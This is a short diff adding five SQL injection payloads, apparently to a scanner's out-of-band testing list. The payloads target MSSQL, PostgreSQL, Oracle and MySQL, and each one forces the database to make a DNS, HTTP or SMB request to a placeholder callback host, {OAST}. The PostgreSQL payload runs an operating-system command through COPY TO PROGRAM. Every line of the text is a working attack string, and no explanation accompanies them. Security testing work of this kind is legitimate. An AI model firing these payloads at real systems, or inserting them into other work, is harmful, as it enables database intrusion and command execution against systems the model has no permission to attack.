@@ -1,0 +1,5 @@
+'; exec master..xp_dirtree '//{OAST}/a'-- -
+'; copy (SELECT '') to program 'nslookup {OAST}'-- -
+' AND EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://{OAST}/">%r;]>'),'/l') IS NULL-- -
+' AND (SELECT UTL_INADDR.get_host_address('{OAST}') FROM dual) IS NULL-- -
+' AND (SELECT LOAD_FILE('\\\\{OAST}\\a'))-- -
